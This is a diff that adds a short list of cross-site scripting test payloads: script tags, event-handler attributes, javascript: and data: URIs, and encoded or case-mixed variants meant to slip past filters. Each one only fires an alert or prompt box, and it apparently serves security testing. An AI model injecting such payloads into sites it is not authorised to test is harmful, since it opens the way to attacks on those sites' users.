@@ -1,0 +1,12 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+<img src=invalid onerror=alert('XSS')>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E  (URL Encoded)
+&lt;script&gt;alert(1)&lt;/script&gt; (HTML Encoded)
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
+<IMG SRC=javascript:prompt(1)>
+<sCrIpT>eval(atob('YWxlcnQoMSk='))</sCrIpT> (Using base64)
